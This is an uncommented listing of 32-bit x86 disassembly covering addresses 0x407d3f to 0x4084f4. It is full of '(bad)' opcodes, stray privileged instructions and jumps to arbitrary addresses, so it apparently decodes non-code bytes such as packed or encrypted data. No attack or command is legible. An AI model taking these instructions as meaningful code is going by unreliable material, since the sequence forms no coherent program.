  407d3f:	inc    ebx
  407d40:	fst    QWORD PTR [edx-0x2c]
  407d43:	push   eax
  407d44:	es sti 
  407d46:	(bad)  
  407d47:	div    ch
  407d49:	add    dl,ch
  407d4b:	jo     0x407cff
  407d4d:	test   eax,0x80ed40f6
  407d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d54:	jmp    0xbb49de4
  407d59:	xor    ah,dl
  407d5b:	lock add al,0xf8
  407d5e:	and    ecx,0x10
  407d61:	push   ecx
  407d62:	ja     0x407d7c
  407d64:	dec    eax
  407d65:	fsub   DWORD PTR ds:0xd9ce41e6
  407d6b:	xchg   esp,eax
  407d6c:	and    esp,DWORD PTR [edx]
  407d6e:	or     BYTE PTR [ebx+eiz*8-0x765ba99d],dh
  407d75:	dec    edx
  407d76:	jnp    0x407dad
  407d78:	xor    esp,eax
  407d7a:	pop    esi
  407d7b:	imul   ebx,DWORD PTR [edi],0xffffffd1
  407d7e:	iret   
  407d7f:	les    ecx,FWORD PTR ds:0x5f4b4396
  407d85:	pop    esp
  407d86:	mov    DWORD PTR [eax],0xc7b49060
  407d8c:	dec    ecx
  407d8d:	push   edi
  407d8e:	icebp  
  407d8f:	mov    edx,0xdeddbc84
  407d94:	push   es
  407d95:	mov    BYTE PTR [esi-0x668c3cc0],bh
  407d9b:	clc    
  407d9c:	adc    eax,0xbda8b516
  407da1:	push   ss
  407da2:	rcr    BYTE PTR [eax-0x5c],1
  407da5:	and    ah,BYTE PTR [ebx]
  407da7:	sub    dl,BYTE PTR [edx+0x237f6cf5]
  407dad:	and    dl,BYTE PTR [esi-0x52]
  407db0:	pop    ebx
  407db1:	cmp    al,0x8b
  407db3:	mov    WORD PTR [edx+0x2],ss
  407db6:	mov    bh,BYTE PTR [edx+eax*2-0x79]
  407dba:	shl    edi,1
  407dbc:	or     al,0xc0
  407dbe:	mov    ebx,0x737905c3
  407dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dc4:	test   eax,0x42f9d410
  407dc9:	ret    0xc0a7
  407dcc:	test   DWORD PTR [edi-0x6e025192],edx
  407dd2:	jae    0x407e17
  407dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dd5:	ret    0xb089
  407dd8:	pop    edi
  407dd9:	in     eax,dx
  407dda:	shl    DWORD PTR [esp+eax*8],0x65
  407dde:	enter  0xbb34,0x28
  407de2:	fcmovnbe st,st(7)
  407de4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407de5:	repnz and BYTE PTR [eax],dl
  407de8:	popa   
  407de9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dea:	xchg   edx,eax
  407deb:	mov    ebx,0x23d1325f
  407df0:	in     al,dx
  407df1:	push   0x45
  407df3:	adc    ebx,DWORD PTR [esp+edx*4]
  407df6:	xchg   ebx,eax
  407df7:	xlat   BYTE PTR ds:[ebx]
  407df8:	dec    esp
  407df9:	jg     0x407d7f
  407dfb:	pop    esi
  407dfc:	test   DWORD PTR [ebx+0x0],0x372f6479
  407e03:	in     eax,0x3d
  407e05:	add    BYTE PTR [edi+0x7a2c078d],cl
  407e0b:	lea    esp,[esi-0x5a]
  407e0e:	imul   ebp,DWORD PTR [edx+eax*8-0x68243e82],0xbdfcf8c1
  407e19:	and    al,0xb9
  407e1b:	enter  0x2925,0x83
  407e1f:	test   al,0x3c
  407e21:	test   BYTE PTR [ebx-0x15d0e9b3],al
  407e27:	fwait
  407e28:	sbb    ecx,DWORD PTR [ecx]
  407e2a:	xchg   DWORD PTR [esi+0x20],eax
  407e2d:	mov    edx,edi
  407e2f:	adc    dl,dl
  407e31:	adc    cl,dh
  407e33:	lods   al,BYTE PTR ds:[esi]
  407e34:	(bad)  [ebx-0x22]
  407e37:	push   0xf
  407e39:	or     ebx,edi
  407e3b:	inc    ebx
  407e3c:	add    bh,BYTE PTR [ebx+0x61edf59e]
  407e42:	cs jbe 0x407de7
  407e45:	in     al,dx
  407e46:	cwde   
  407e47:	adc    eax,0x7c2b7c20
  407e4c:	sar    cl,cl
  407e4e:	pop    ds
  407e4f:	sub    DWORD PTR [esi],ebx
  407e51:	sbb    ecx,ebx
  407e53:	loopne 0x407e34
  407e55:	retf   
  407e56:	push   edi
  407e57:	jmp    0x407ed2
  407e59:	sbb    DWORD PTR [edi*1-0x631d9755],eax
  407e60:	or     ebx,DWORD PTR [ebx+0x4f]
  407e63:	mov    edi,edi
  407e65:	les    ebx,FWORD PTR [esp+eiz*8+0x8]
  407e69:	sahf   
  407e6a:	mov    dl,0x94
  407e6c:	arpl   WORD PTR [ebx],bx
  407e6e:	js     0x407df3
  407e70:	pop    eax
  407e71:	mov    bh,cl
  407e73:	mov    DWORD PTR [eax],ecx
  407e75:	mov    eax,0xa9113941
  407e7a:	sbb    al,0x12
  407e7c:	add    al,0x95
  407e7e:	out    dx,al
  407e7f:	ror    DWORD PTR [edx],cl
  407e81:	imul   eax,DWORD PTR [edx+edx*4+0x3e],0xffffffa1
  407e86:	repnz xor ch,al
  407e89:	sbb    bl,BYTE PTR [esi+esi*2+0x25]
  407e8d:	sub    al,0x54
  407e8f:	test   ah,al
  407e91:	cmp    ecx,edi
  407e93:	jmp    0x8c74c88d
  407e98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e99:	lea    edi,[esp+esi*1-0x1b]
  407e9d:	pushf  
  407e9e:	mov    eax,0xe3b257e
  407ea3:	xchg   esi,eax
  407ea4:	les    ebx,FWORD PTR [ebx]
  407ea6:	test   DWORD PTR ds:0x19fd2c2a,0x73b16dd1
  407eb0:	adc    DWORD PTR [ecx+0x43],eax
  407eb3:	repnz fcmovne st,st(3)
  407eb6:	daa    
  407eb7:	or     BYTE PTR [edi],cl
  407eb9:	popf   
  407eba:	(bad)  
  407ebb:	push   ebp
  407ebc:	jle    0x407eb5
  407ebe:	mov    ebx,0x17fd7f0
  407ec3:	pop    eax
  407ec4:	int    0xd5
  407ec6:	shl    DWORD PTR ds:0x91118bf0,1
  407ecc:	ror    BYTE PTR [edi-0x7b],cl
  407ecf:	shl    bh,cl
  407ed1:	fwait
  407ed2:	mov    dl,0xb
  407ed4:	add    eax,eax
  407ed6:	adc    al,0x8d
  407ed8:	es call 0x897e:0xfb85706e
  407ee0:	xchg   bh,ah
  407ee2:	(bad)  
  407ee3:	push   eax
  407ee4:	jbe    0x407e6f
  407ee6:	out    0x19,al
  407ee8:	mov    DWORD PTR [esi],eax
  407eea:	repnz inc esi
  407eec:	into   
  407eed:	fisttp WORD PTR ss:[ebp+0x6]
  407ef1:	adc    al,0x9f
  407ef3:	mov    edi,0x2668cceb
  407ef8:	pusha  
  407ef9:	cmp    al,0xd0
  407efb:	pushf  
  407efc:	jge    0x407f61
  407efe:	or     ch,dl
  407f00:	fs inc ecx
  407f02:	inc    eax
  407f03:	mov    al,ds:0x64f05395
  407f08:	xchg   ecx,eax
  407f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f0a:	ret    
  407f0b:	push   esp
  407f0c:	stos   DWORD PTR es:[edi],eax
  407f0d:	aad    0xc
  407f0f:	aam    0x1a
  407f11:	mov    bh,0x7f
  407f13:	mov    dl,0xa1
  407f15:	fsubr  st,st(4)
  407f17:	mov    ch,0xb8
  407f19:	or     al,0x1f
  407f1b:	xchg   esi,eax
  407f1c:	mov    edi,DWORD PTR ds:0xaec987d2
  407f22:	xchg   esi,eax
  407f23:	dec    edi
  407f24:	add    eax,DWORD PTR [edi+0x71]
  407f27:	dec    edx
  407f28:	stos   DWORD PTR es:[edi],eax
  407f29:	and    edx,eax
  407f2b:	aaa    
  407f2c:	hlt    
  407f2d:	xor    ch,BYTE PTR [ecx]
  407f2f:	in     eax,dx
  407f30:	idiv   DWORD PTR [edi-0x686659bb]
  407f36:	inc    edi
  407f37:	repnz dec ebp
  407f39:	xchg   esp,eax
  407f3a:	sub    edi,edx
  407f3c:	call   0x160ddb81
  407f41:	in     al,dx
  407f42:	fsub   QWORD PTR gs:[ebx-0x23]
  407f46:	(bad)  
  407f47:	mov    edi,0xb295e6e6
  407f4c:	mov    ah,0x32
  407f4e:	and    eax,0x7b6ff371
  407f53:	into   
  407f54:	push   0x40
  407f56:	icebp  
  407f57:	lods   al,BYTE PTR ds:[esi]
  407f58:	mov    ebx,0x4c1a8bf1
  407f5d:	(bad)  
  407f5e:	fdivr  DWORD PTR [ecx-0x1c]
  407f61:	adc    al,0x8a
  407f63:	push   ecx
  407f64:	sbb    eax,0xccdb38d2
  407f69:	addr16 out dx,al
  407f6b:	jl     0x407f65
  407f6d:	push   ebx
  407f6e:	outs   dx,DWORD PTR ds:[esi]
  407f6f:	sub    BYTE PTR [eax+edx*8],0xcf
  407f73:	inc    esp
  407f74:	push   esp
  407f75:	lahf   
  407f76:	ja     0x407fba
  407f78:	push   cs
  407f79:	push   esi
  407f7a:	jbe    0x407fe7
  407f7c:	or     eax,DWORD PTR [ebp+0x169108ad]
  407f82:	sub    dh,dh
  407f84:	xchg   ebx,eax
  407f85:	dec    esp
  407f86:	or     eax,0xb02564c8
  407f8b:	lods   al,BYTE PTR ds:[esi]
  407f8c:	fcom   QWORD PTR fs:0xbad82bd0
  407f93:	jp     0x407f4a
  407f95:	rcr    esp,0xf5
  407f98:	sub    DWORD PTR [ebx+0x5e76a4d],eax
  407f9e:	mov    esi,0x46258389
  407fa3:	lock jp 0x407fb1
  407fa6:	scas   eax,DWORD PTR es:[edi]
  407fa7:	(bad)  
  407fa8:	js     0x407f43
  407faa:	push   eax
  407fab:	cdq    
  407fac:	in     eax,dx
  407fad:	into   
  407fae:	mov    bh,0xe
  407fb0:	mov    ah,0xfd
  407fb2:	dec    ebp
  407fb3:	shr    DWORD PTR [edx],cl
  407fb5:	push   ebx
  407fb6:	cmp    eax,0x7f3edf36
  407fbb:	xor    eax,DWORD PTR ds:0x6ae56d4e
  407fc1:	sub    BYTE PTR [edx-0x6ad5478f],bh
  407fc7:	mov    dh,0xe6
  407fc9:	mov    ecx,0xf7070711
  407fce:	jge    0x407f84
  407fd0:	test   DWORD PTR ds:0x2430,0xe735083e
  407fd9:	fidiv  WORD PTR [edi-0x48]
  407fdc:	inc    ebp
  407fdd:	ins    DWORD PTR es:[edi],dx
  407fde:	xor    eax,esi
  407fe0:	fisttp DWORD PTR [eax]
  407fe2:	pop    edx
  407fe3:	pop    es
  407fe4:	xor    al,0xf2
  407fe6:	mov    dl,0xed
  407fe8:	adc    al,BYTE PTR [edi]
  407fea:	xchg   ebp,eax
  407feb:	adc    eax,0xc4b4cadc
  407ff0:	dec    ebx
  407ff1:	push   es
  407ff2:	aaa    
  407ff3:	(bad)  
  407ff4:	mov    es,WORD PTR [ebx+edx*4-0x45]
  407ff8:	ins    BYTE PTR es:[edi],dx
  407ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ffa:	mov    esi,0x4486d17b
  407fff:	popf   
  408000:	fcom   DWORD PTR [esi+0x2065e4dd]
  408006:	push   edi
  408007:	fst    DWORD PTR [ecx-0x1034a0a2]
  40800d:	(bad)  
  40800e:	fisttp QWORD PTR [edx+0x1b]
  408011:	nop
  408012:	ds retf 
  408014:	repnz es mov edi,0xf82fb763
  40801b:	mov    eax,0x9dda9faf
  408020:	xchg   esp,eax
  408021:	ds sahf 
  408023:	test   al,0xeb
  408025:	es mov eax,?
  408028:	ror    BYTE PTR [ebp-0x4c],cl
  40802b:	add    eax,0xa90ce9bc
  408030:	call   DWORD PTR [eax+eax*1-0x66]
  408034:	mov    BYTE PTR [edi-0x44263611],ch
  40803a:	or     ah,al
  40803c:	loopne 0x40801a
  40803e:	stos   BYTE PTR es:[edi],al
  40803f:	cmp    eax,0xc3e075d5
  408044:	xchg   edi,eax
  408045:	es xor al,0xd2
  408048:	pop    edi
  40804a:	sub    eax,0x63686b0d
  40804f:	shl    dh,cl
  408051:	(bad)  
  408052:	mov    ebp,0x1ac92e5c
  408057:	push   0x5d
  408059:	or     DWORD PTR [ecx],0xffffffcc
  40805c:	cld    
  40805d:	jne    0x40802c
  40805f:	sbb    DWORD PTR [ebx],ebp
  408061:	sbb    DWORD PTR [edx],0xfffffffb
  408064:	mov    dl,0xa6
  408066:	shl    BYTE PTR [esi-0x77b9c384],cl
  40806c:	sub    BYTE PTR [eax],0x33
  40806f:	nop
  408070:	ror    BYTE PTR [esi-0x77],1
  408073:	sbb    ch,BYTE PTR [ebx+eiz*4]
  408076:	es popa 
  408078:	mov    al,0xfb
  40807a:	push   ebp
  40807b:	and    al,BYTE PTR [edx]
  40807d:	dec    edi
  40807e:	push   0x625dc946
  408083:	and    esi,ebx
  408085:	mov    ds:0x9b41d09,al
  40808a:	sub    ch,BYTE PTR [ebx]
  40808c:	test   DWORD PTR [ebx-0x1c],0xb04437c8
  408093:	sub    eax,0x79dc55b1
  408098:	inc    esp
  408099:	dec    dh
  40809b:	mov    bl,0xc
  40809d:	sub    DWORD PTR [ecx],eax
  40809f:	xchg   edi,eax
  4080a0:	(bad)  
  4080a1:	adc    eax,0x1f276b09
  4080a6:	out    0x1c,eax
  4080a8:	les    edx,FWORD PTR [edi+0x7a]
  4080ab:	push   ds
  4080ac:	and    al,0x49
  4080ae:	fwait
  4080af:	sti    
  4080b0:	sbb    al,0xf5
  4080b2:	repnz int 0xbd
  4080b5:	mov    esi,0xdbaf0987
  4080ba:	(bad)  
  4080bc:	add    eax,0x2c073cc2
  4080c1:	scas   al,BYTE PTR es:[edi]
  4080c2:	sbb    al,0xaa
  4080c4:	stos   DWORD PTR es:[edi],eax
  4080c5:	mov    DWORD PTR [edi+0x1c],ecx
  4080c8:	test   eax,0xc63b8109
  4080cd:	pop    edi
  4080ce:	call   0x466331d3
  4080d3:	mov    ds:0xbb1f1662,al
  4080d8:	jne    0x408157
  4080da:	xlat   BYTE PTR ds:[ebx]
  4080db:	xor    al,0x3c
  4080dd:	jo     0x40805f
  4080df:	lds    edx,FWORD PTR ds:0x271f618b
  4080e5:	pusha  
  4080e6:	add    al,BYTE PTR [ecx+0x1f7528fb]
  4080ec:	enter  0xcb4e,0x3d
  4080f0:	inc    edi
  4080f1:	mov    dl,0xeb
  4080f3:	addr16 push 0x6e
  4080f6:	pop    ds
  4080f7:	in     eax,0x63
  4080f9:	adc    ebx,DWORD PTR [edx+0x5bf3a2df]
  4080ff:	call   0xea2fe2c1
  408104:	dec    edx
  408105:	aad    0xcc
  408107:	fwait
  408108:	mov    edi,0xcc56fd40
  40810d:	or     bh,BYTE PTR [esi]
  40810f:	sbb    BYTE PTR [ebx+edi*2-0x7f],ch
  408113:	dec    edi
  408114:	fsub   st,st(0)
  408116:	sub    dh,BYTE PTR ds:0x76f17765
  40811c:	jb     0x40811d
  40811e:	outs   dx,BYTE PTR ds:[esi]
  40811f:	fwait
  408120:	or     ah,BYTE PTR [edi+0x70d4515a]
  408126:	outs   dx,DWORD PTR ds:[esi]
  408127:	inc    edi
  408128:	aad    0xfe
  40812a:	push   es
  40812b:	out    dx,al
  40812c:	mov    bh,0x6d
  40812e:	lea    ebp,[ebx]
  408130:	iret   
  408131:	push   0xffffffe0
  408133:	stc    
  408134:	sbb    al,0xeb
  408136:	pop    ds
  408137:	push   eax
  408138:	push   0x4b29a3f5
  40813d:	pop    ecx
  40813e:	xor    al,0x44
  408140:	jbe    0x408161
  408142:	dec    edx
  408143:	test   eax,0xb9b0346b
  408148:	dec    BYTE PTR [ebx-0x23b246e4]
  40814e:	mov    bh,0x1c
  408150:	(bad)  
  408151:	ror    BYTE PTR [edi+0x20],0x9a
  408155:	xlat   BYTE PTR ds:[ebx]
  408156:	sub    DWORD PTR [ecx+0x2ae8df34],0xa2a7b656
  408160:	jp     0x408147
  408162:	les    edx,FWORD PTR [esp+edx*8-0x58]
  408166:	pusha  
  408167:	jg     0x4081a4
  408169:	loopne 0x4081d3
  40816b:	add    dl,BYTE PTR [ebp+0x3f1595b8]
  408171:	je     0x40813b
  408173:	jae    0x40815e
  408175:	sahf   
  408176:	icebp  
  408177:	sbb    eax,DWORD PTR [edx-0x6ac5f27b]
  40817d:	inc    esp
  40817e:	call   FWORD PTR [eax-0x26]
  408181:	es hlt 
  408183:	mov    cl,0xa1
  408185:	test   DWORD PTR [ebp-0x59],edx
  408188:	sysret 
  40818a:	sub    al,0xd7
  40818c:	sub    al,0x80
  40818e:	cs inc eax
  408190:	jns    0x408146
  408192:	xchg   ebx,eax
  408193:	push   0xbbf0e43a
  408198:	inc    eax
  408199:	add    eax,0xc9db6acc
  40819e:	shl    BYTE PTR [ecx-0x5c],cl
  4081a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081a2:	lea    ecx,[edi]
  4081a4:	aaa    
  4081a5:	jl     0x408136
  4081a7:	push   ebp
  4081a8:	outs   dx,BYTE PTR ds:[esi]
  4081a9:	ja     0x40819f
  4081ab:	mov    al,0x62
  4081ad:	cmp    DWORD PTR ds:0x6a28ee8c,esp
  4081b3:	push   esi
  4081b4:	sub    DWORD PTR [esi],ebx
  4081b6:	stos   BYTE PTR es:[edi],al
  4081b7:	push   edi
  4081b8:	xchg   edi,eax
  4081b9:	ja     0x40819f
  4081bb:	sbb    dl,BYTE PTR [eax+0x49]
  4081be:	stos   BYTE PTR es:[edi],al
  4081bf:	fstp   TBYTE PTR [esi]
  4081c1:	mov    al,ds:0x1c3df50c
  4081c6:	sti    
  4081c7:	mov    eax,ds:0x67b84230
  4081cc:	ror    BYTE PTR [ecx+0x6f],1
  4081cf:	sahf   
  4081d0:	sar    BYTE PTR [esp+eax*4],1
  4081d3:	cld    
  4081d4:	ja     0x4081f7
  4081d6:	js     0x408210
  4081d8:	inc    ebp
  4081d9:	stc    
  4081da:	xor    BYTE PTR [edi],dh
  4081dc:	or     eax,0x6c44fb93
  4081e1:	mov    eax,0x4f46d3ca
  4081e6:	call   0x912ef537
  4081eb:	xchg   BYTE PTR [ebx],cl
  4081ed:	jge    0x408250
  4081ef:	int3   
  4081f0:	mov    ch,0x76
  4081f2:	inc    edi
  4081f3:	sub    al,0x9b
  4081f5:	xchg   ebx,eax
  4081f6:	xchg   ebx,eax
  4081f7:	inc    eax
  4081f8:	xor    eax,DWORD PTR [ecx]
  4081fa:	dec    edi
  4081fb:	lods   eax,DWORD PTR ds:[esi]
  4081fc:	push   edx
  4081fd:	imul   edi,DWORD PTR [eax+0x3629a915],0x5c
  408204:	adc    DWORD PTR [esi-0x49fc7583],edi
  40820a:	xor    al,0x2
  40820c:	mov    bl,0x3d
  40820e:	arpl   WORD PTR [edx+0x1d7373f9],bx
  408214:	aad    0x91
  408216:	aad    0x2a
  408218:	shl    DWORD PTR [esi+0x5ca058e8],cl
  40821e:	cmp    al,0x81
  408220:	retf   0xf0c5
  408223:	or     esi,edx
  408225:	jle    0x40821b
  408227:	retf   
  408228:	fwait
  408229:	xor    bh,dl
  40822b:	jecxz  0x4081f1
  40822d:	dec    eax
  40822e:	xor    ebx,DWORD PTR [esi]
  408230:	jno    0x408234
  408232:	inc    DWORD PTR [ebp-0xd71e438]
  408238:	test   eax,0x7325743f
  40823d:	push   eax
  40823e:	and    BYTE PTR [ebp+0x3be2d69b],0x5a
  408245:	out    dx,eax
  408246:	std    
  408247:	or     DWORD PTR [eax-0x6cdd2860],edi
  40824d:	sub    BYTE PTR [eax+0x4c],al
  408250:	lahf   
  408251:	pop    es
  408252:	mov    ebp,0x901997c2
  408257:	cmp    edi,0x6ca95072
  40825d:	jbe    0x4082b9
  40825f:	(bad)
  408263:	loope  0x4082e4
  408265:	test   DWORD PTR [eax-0x78],esi
  408268:	xor    eax,0x8c75eeef
  40826d:	mov    ebp,0xea9ab90
  408272:	popa   
  408273:	bound  edx,QWORD PTR [ebx+0x3d5ea120]
  408279:	fwait
  40827a:	xchg   esp,eax
  40827b:	mov    al,0x88
  40827d:	rcl    DWORD PTR [ecx+edx*1+0x65],cl
  408281:	cli    
  408282:	in     al,0x33
  408284:	jnp    0x4082ab
  408286:	jb     0x40828d
  408288:	(bad)  
  408289:	inc    ebx
  40828a:	fwait
  40828b:	mov    dl,0x1b
  40828d:	shr    esp,1
  40828f:	mov    ah,0x37
  408291:	dec    eax
  408292:	les    ebx,FWORD PTR [edi-0x5b]
  408295:	nop
  408296:	push   es
  408297:	xor    BYTE PTR [esi-0x10],0x0
  40829b:	(bad)
  40829e:	aad    0x9f
  4082a0:	xchg   ebp,eax
  4082a1:	mov    ds:0xdae81bb2,al
  4082a6:	jmp    0xc057:0xfd5ef540
  4082ad:	inc    ebp
  4082ae:	adc    bh,bh
  4082b0:	jo     0x408287
  4082b2:	in     eax,0x31
  4082b4:	int    0xb1
  4082b6:	aas    
  4082b7:	dec    ecx
  4082b8:	xchg   ecx,eax
  4082b9:	xor    cl,BYTE PTR [esi+0x4ecb9397]
  4082bf:	pop    ebp
  4082c0:	mov    esi,0x7cc2544a
  4082c5:	stos   BYTE PTR es:[edi],al
  4082c6:	push   es
  4082c7:	ss xchg ecx,eax
  4082c9:	ins    BYTE PTR es:[edi],dx
  4082ca:	loopne 0x4082f2
  4082cc:	daa    
  4082cd:	sbb    DWORD PTR [ebx],0x974e6044
  4082d3:	paddw  mm1,mm3
  4082d6:	mov    WORD PTR [eax-0xd],ds
  4082d9:	enter  0xef4b,0xc2
  4082dd:	pop    es
  4082de:	hlt    
  4082df:	push   esp
  4082e0:	xor    al,0x42
  4082e2:	pop    ecx
  4082e3:	(bad)  
  4082e4:	jb     0x40828a
  4082e6:	sbb    BYTE PTR [esi],bh
  4082e8:	and    edx,ebp
  4082ea:	jmp    0x374a5029
  4082ef:	and    BYTE PTR [edi-0x1a],al
  4082f2:	mov    DWORD PTR [esi],edx
  4082f4:	ret    
  4082f5:	cmp    BYTE PTR [eax+0x3f],ch
  4082f8:	out    0x11,eax
  4082fa:	imul   edx,DWORD PTR [eax-0x3751ec77],0x9
  408301:	dec    ebx
  408302:	cmp    BYTE PTR [ebx],cl
  408304:	or     al,0x35
  408306:	jmp    0x3f56579b
  40830b:	ins    DWORD PTR es:[edi],dx
  40830c:	cld    
  40830d:	dec    eax
  40830e:	icebp  
  40830f:	inc    ebx
  408310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408311:	into   
  408312:	pop    eax
  408313:	mov    ds:0xf98f9039,al
  408318:	mov    bl,0xaf
  40831a:	jg     0x4082f7
  40831c:	dec    edx
  40831d:	inc    esi
  40831e:	and    esp,DWORD PTR [ecx-0x7d]
  408321:	cwd    
  408323:	stos   DWORD PTR es:[edi],eax
  408324:	and    ebx,ebx
  408326:	mov    ecx,0xa4360fe4
  40832b:	mov    BYTE PTR [ecx+ecx*1-0x57],bl
  40832f:	pop    ss
  408330:	cmp    dl,BYTE PTR [ecx-0x51]
  408333:	inc    edx
  408334:	pop    ebp
  408335:	adc    esi,esi
  408337:	cwde   
  408338:	ss inc ebp
  40833a:	retf   
  40833b:	inc    edx
  40833c:	sub    edx,DWORD PTR [eax+edi*2]
  40833f:	hlt    
  408340:	and    cl,BYTE PTR ds:0xf1743a03
  408346:	icebp  
  408347:	sbb    eax,0x64a2dfcb
  40834c:	iret   
  40834d:	and    DWORD PTR [ebx],edi
  40834f:	mov    ds:0x5dff0d99,eax
  408354:	(bad)  
  408355:	dec    esp
  408356:	out    0xbf,eax
  408358:	fnstsw WORD PTR [esi]
  40835a:	xor    eax,0x21b0cfb2
  40835f:	outs   dx,DWORD PTR ds:[esi]
  408360:	xor    BYTE PTR [edx-0x6a],cl
  408363:	out    0xd5,al
  408365:	add    DWORD PTR [edx-0x25],edx
  408368:	(bad)  
  408369:	daa    
  40836a:	ret    0x723f
  40836d:	jne    0x40832e
  40836f:	mov    al,ds:0x8ab1ddfa
  408374:	inc    edi
  408375:	ja     0x40834b
  408377:	enter  0x3ca6,0x0
  40837b:	dec    esi
  40837c:	rol    ebx,1
  40837e:	inc    ecx
  40837f:	inc    ecx
  408380:	mov    edx,0x90afe544
  408385:	lock pusha 
  408387:	les    ebx,FWORD PTR [esi-0x5c]
  40838a:	push   es
  40838b:	mov    fs,WORD PTR [ecx]
  40838d:	ss daa 
  40838f:	(bad)  
  408390:	sbb    esp,eax
  408392:	sub    BYTE PTR [edx-0x794ae918],bl
  408398:	mov    edx,0xcd6f9d9a
  40839d:	sti    
  40839e:	xor    al,0x7b
  4083a0:	test   al,0xf3
  4083a2:	add    edx,ebx
  4083a4:	inc    ebp
  4083a5:	push   ebx
  4083a6:	xchg   ebp,eax
  4083a7:	pushf  
  4083a8:	test   al,0x1d
  4083aa:	or     edx,DWORD PTR [edx+edx*1+0x19]
  4083ae:	pop    esi
  4083af:	push   0xdc4efcb7
  4083b4:	mov    edx,DWORD PTR [edx+ecx*8+0x2b]
  4083b8:	xor    dl,BYTE PTR [ecx-0x7]
  4083bb:	ret    0x47f6
  4083be:	clc    
  4083bf:	push   ss
  4083c0:	imul   esi,DWORD PTR [ebx+0x58],0x71f6a08f
  4083c7:	add    cl,bl
  4083c9:	sub    esp,edx
  4083cb:	lods   al,BYTE PTR ds:[esi]
  4083cc:	jno    0x4083a4
  4083ce:	lea    esi,[ebx-0xf]
  4083d1:	pop    ecx
  4083d2:	aaa    
  4083d3:	ret    0x2dab
  4083d6:	cld    
  4083d7:	stos   BYTE PTR es:[edi],al
  4083d8:	ret    
  4083d9:	cs stos DWORD PTR es:[edi],eax
  4083db:	out    0x4f,al
  4083dd:	xchg   edi,eax
  4083de:	in     eax,0x3b
  4083e0:	popa   
  4083e1:	retfw  
  4083e3:	or     al,0x66
  4083e5:	pusha  
  4083e6:	or     BYTE PTR [ebx-0x39],dl
  4083e9:	ins    BYTE PTR es:[edi],dx
  4083ea:	scas   eax,DWORD PTR es:[edi]
  4083eb:	mov    eax,0x164749
  4083f0:	jo     0x40839e
  4083f2:	cmp    edi,DWORD PTR ds:0x29c31d57
  4083f8:	mov    ss,WORD PTR [edi-0x5f]
  4083fb:	xchg   esp,eax
  4083fc:	sub    dh,dl
  4083fe:	pop    edx
  4083ff:	mov    eax,0x8fe997d6
  408404:	pop    ds
  408405:	jmp    FWORD PTR [eax]
  408407:	mov    dl,0xb5
  408409:	ja     0x4083d5
  40840b:	test   eax,0xa937523
  408410:	pop    edx
  408411:	ins    DWORD PTR es:[edi],dx
  408412:	repnz or al,0x78
  408415:	in     al,dx
  408416:	jmp    0xc010d96f
  40841b:	scas   eax,DWORD PTR es:[edi]
  40841c:	repnz sbb DWORD PTR [ebx-0x602aa74],ebp
  408423:	mov    dh,0x7f
  408425:	lods   eax,DWORD PTR fs:[esi]
  408427:	jg     0x408443
  408429:	pop    esi
  40842a:	dec    eax
  40842b:	xor    BYTE PTR [ebx],ch
  40842d:	out    dx,al
  40842e:	or     ebx,esi
  408430:	mov    ah,BYTE PTR [ebx]
  408432:	fisub  DWORD PTR [edx+0x2bd494b]
  408438:	add    dl,0x35
  40843b:	pop    ebp
  40843c:	je     0x40840b
  40843e:	pop    eax
  40843f:	mov    esp,0xc26579f2
  408444:	ds mov es,eax
  408447:	ins    DWORD PTR es:[edi],dx
  408448:	(bad)  
  408449:	out    0x6e,al
  40844b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40844c:	xor    DWORD PTR [edi+0x6c5ca127],eax
  408452:	fnstcw WORD PTR [bx+di+0x43]
  408456:	jmp    0x408457
  408458:	in     al,0x42
  40845a:	push   edi
  40845b:	fild   WORD PTR [edi]
  40845d:	add    ebp,DWORD PTR [ebx+0xcba4ff5]
  408463:	mov    edi,0x9f2ab818
  408468:	or     esi,DWORD PTR [ecx-0x54069613]
  40846e:	out    0xb,al
  408470:	pop    esp
  408471:	jmp    0x9e993ec3
  408476:	xlat   BYTE PTR ds:[ebx]
  408477:	inc    ebp
  408478:	out    dx,eax
  408479:	jno    0x408467
  40847b:	pop    ebp
  40847c:	cwde   
  40847d:	sub    DWORD PTR [edi+edi*2-0x45],esp
  408481:	inc    esi
  408482:	cmp    eax,0x68845b35
  408487:	mov    esi,0x9e789f83
  40848c:	adc    eax,0x7c895aac
  408491:	test   edi,esi
  408493:	xchg   ebx,eax
  408494:	(bad)  
  408495:	sbb    ch,ah
  408497:	mov    dl,0x68
  408499:	or     dl,dl
  40849b:	(bad)  
  40849c:	cmc    
  40849d:	stos   DWORD PTR es:[edi],eax
  40849e:	sub    bl,bh
  4084a0:	in     eax,dx
  4084a1:	pusha  
  4084a2:	jmp    0xa65b17df
  4084a7:	loope  0x4084d5
  4084a9:	rol    DWORD PTR [edi+0x46159798],cl
  4084af:	push   ds
  4084b0:	rcl    DWORD PTR [ebx-0x3745bbc5],0xa0
  4084b7:	div    ah
  4084b9:	dec    ecx
  4084ba:	inc    edx
  4084bb:	jb     0x40848a
  4084bd:	daa    
  4084be:	leave  
  4084bf:	gs and eax,0xbf799a0c
  4084c5:	ja     0x408542
  4084c7:	sub    bl,BYTE PTR [edx]
  4084c9:	push   cs
  4084ca:	fdivrp st(3),st
  4084cc:	mov    ah,0xb6
  4084ce:	ret    
  4084cf:	scas   eax,DWORD PTR es:[edi]
  4084d0:	fstp   QWORD PTR [ecx]
  4084d2:	sub    edi,edi
  4084d4:	enter  0xa74a,0x16
  4084d8:	in     eax,dx
  4084d9:	sbb    eax,0xe04c84f8
  4084de:	(bad)  [eax-0x74]
  4084e1:	idiv   DWORD PTR [eax-0x47]
  4084e4:	xor    al,BYTE PTR [eax]
  4084e6:	lahf   
  4084e7:	out    0x5a,al
  4084e9:	push   0xffffffb2
  4084eb:	fwait
  4084ec:	sbb    eax,0x8cb1ca27
  4084f1:	and    DWORD PTR [edx],ebx
  4084f3:	aas    
  4084f4:	pop    esp
